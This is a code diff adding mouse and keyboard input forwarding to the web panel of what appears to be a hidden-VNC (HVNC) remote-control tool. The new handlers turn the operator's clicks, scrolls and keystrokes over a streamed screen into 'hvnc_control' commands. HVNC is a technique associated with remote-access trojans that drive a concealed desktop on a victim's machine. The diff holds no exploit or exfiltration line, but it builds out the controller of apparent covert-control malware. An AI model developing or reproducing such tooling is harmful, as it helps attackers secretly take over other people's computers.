@@ -104,10 +104,20 @@
       height: 100%;
       object-fit: contain;
       display: none;
+      /* Prevent image selection and dragging */
+      user-select: none;
+      -webkit-user-drag: none;
+      pointer-events: none;
     }
 
     .hvnc-screen-img.active {
       display: block;
+    }
+    
+    /* Screen area should capture all input */
+    .hvnc-screen-area {
+      user-select: none;
+      cursor: crosshair;
     }
 
     .hvnc-screen-placeholder {
@@ -597,6 +607,7 @@
       // DOM Elements
       const dom = {
         status: document.getElementById("hvncStatus"),
+        screenArea: document.querySelector(".hvnc-screen-area"),
         screenImg: document.getElementById("hvncScreenImg"),
         screenPlaceholder: document.getElementById("hvncScreenPlaceholder"),
         intervalSlider: document.getElementById("hvncIntervalSlider"),
@@ -626,6 +637,12 @@
         interval: 500,
         quality: 50,
         resize: 50,
+      };
+      
+      // Input state tracking
+      const inputState = {
+        pressedKeys: new Set(),
+        mouseButtonsDown: new Set(),
       };
 
       /**
@@ -863,12 +880,221 @@
         }
       }
 
+      // ===== Mouse/Keyboard Input Handling =====
+      
+      /**
+       * Get cursor position relative to screen area, scaled to actual desktop resolution
+       */
+      function getCursorPosition(e) {
+        if (!dom.screenArea || !dom.screenImg) return { x: 0, y: 0 };
+        
+        const rect = dom.screenArea.getBoundingClientRect();
+        const imgRect = dom.screenImg.getBoundingClientRect();
+        
+        // Calculate position relative to the displayed image
+        let x = e.clientX - imgRect.left;
+        let y = e.clientY - imgRect.top;
+        
+        // Scale to actual desktop resolution (assuming 1920x1080)
+        // The image is scaled to fit, so we need to reverse that
+        const desktopWidth = 1920;  // Default desktop width
+        const desktopHeight = 1080; // Default desktop height
+        
+        const scaleX = desktopWidth / imgRect.width;
+        const scaleY = desktopHeight / imgRect.height;
+        
+        x = Math.round(x * scaleX);
+        y = Math.round(y * scaleY);
+        
+        // Clamp to desktop bounds
+        x = Math.max(0, Math.min(desktopWidth, x));
+        y = Math.max(0, Math.min(desktopHeight, y));
+        
+        return { x, y };
+      }
+      
+      /**
+       * Map mouse button number to string
+       */
+      function mapMouseButton(button) {
+        switch (button) {
+          case 0: return "left";
+          case 1: return "middle";
+          case 2: return "right";
+          default: return "left";
+        }
+      }
+      
+      /**
+       * Send HVNC control command to parent
+       */
+      function sendHvncControl(payload) {
+        sendToParent("hvnc_control", payload);
+      }
+      
+      /**
+       * Bind mouse and keyboard input events to screen area
+       */
+      function bindInputEvents() {
+        if (!dom.screenArea) return;
+        
+        // Make screen area focusable
+        dom.screenArea.setAttribute("tabindex", "0");
+        
+        // Prevent context menu
+        dom.screenArea.addEventListener("contextmenu", (e) => {
+          e.preventDefault();
+        });
+        
+        // Mouse move
+        dom.screenArea.addEventListener("mousemove", (e) => {
+          const pos = getCursorPosition(e);
+          sendHvncControl({
+            type: "mouse_move",
+            x: pos.x,
+            y: pos.y,
+          });
+        });
+        
+        // Mouse down
+        dom.screenArea.addEventListener("mousedown", (e) => {
+          e.preventDefault();
+          dom.screenArea.focus();
+          
+          const pos = getCursorPosition(e);
+          const button = mapMouseButton(e.button);
+          inputState.mouseButtonsDown.add(button);
+          
+          sendHvncControl({
+            type: "mouse_down",
+            x: pos.x,
+            y: pos.y,
+            button,
+          });
+        });
+        
+        // Mouse up
+        dom.screenArea.addEventListener("mouseup", (e) => {
+          const pos = getCursorPosition(e);
+          const button = mapMouseButton(e.button);
+          inputState.mouseButtonsDown.delete(button);
+          
+          sendHvncControl({
+            type: "mouse_up",
+            x: pos.x,
+            y: pos.y,
+            button,
+          });
+        });
+        
+        // Mouse wheel
+        dom.screenArea.addEventListener("wheel", (e) => {
+          e.preventDefault();
+          const pos = getCursorPosition(e);
+          
+          // Normalize delta values
+          let deltaX = e.deltaX;
+          let deltaY = e.deltaY;
+          
+          // Convert to standard wheel units
+          if (e.deltaMode === 1) { // DOM_DELTA_LINE
+            deltaX *= 40;
+            deltaY *= 40;
+          } else if (e.deltaMode === 2) { // DOM_DELTA_PAGE
+            deltaX *= 800;
+            deltaY *= 600;
+          }
+          
+          sendHvncControl({
+            type: "mouse_scroll",
+            x: pos.x,
+            y: pos.y,
+            delta_x: Math.round(deltaX),
+            delta_y: Math.round(deltaY),
+          });
+        }, { passive: false });
+        
+        // Key down
+        dom.screenArea.addEventListener("keydown", (e) => {
+          e.preventDefault();
+          
+          // Handle printable characters directly
+          const hasChord = e.ctrlKey || e.altKey || e.metaKey;
+          const isPrintable = e.key && e.key.length === 1;
+          
+          if (isPrintable && !hasChord) {
+            sendHvncControl({
+              type: "text_input",
+              text: e.key,
+            });
+            return;
+          }
+          
+          // Handle special keys
+          const key = e.code || e.key;
+          if (!key) return;
+          
+          // Prevent repeat key events
+          if (e.repeat && inputState.pressedKeys.has(key)) return;
+          
+          if (!inputState.pressedKeys.has(key)) {
+            inputState.pressedKeys.add(key);
+            sendHvncControl({
+              type: "key_down",
+              key,
+            });
+          }
+        });
+        
+        // Key up
+        dom.screenArea.addEventListener("keyup", (e) => {
+          e.preventDefault();
+          
+          const key = e.code || e.key;
+          if (!key) return;
+          
+          if (!inputState.pressedKeys.has(key)) return;
+          
+          inputState.pressedKeys.delete(key);
+          sendHvncControl({
+            type: "key_up",
+            key,
+          });
+        });
+        
+        // Release all inputs when window loses focus
+        window.addEventListener("blur", () => {
+          // Release all mouse buttons
+          inputState.mouseButtonsDown.forEach(button => {
+            sendHvncControl({
+              type: "mouse_up",
+              x: 0,
+              y: 0,
+              button,
+            });
+          });
+          inputState.mouseButtonsDown.clear();
+          
+          // Release all keys
+          inputState.pressedKeys.forEach(key => {
+            sendHvncControl({
+              type: "key_up",
+              key,
+            });
+          });
+          inputState.pressedKeys.clear();
+        });
+      }
+
       /**
        * Initialize
        */
       function init() {
         // Listen for messages from parent
         window.addEventListener("message", handleParentMessage);
+        
+        // Bind mouse/keyboard input events
+        bindInputEvents();
 
         // Action buttons
         document.querySelectorAll("[data-hvnc-action]").forEach(btn => {
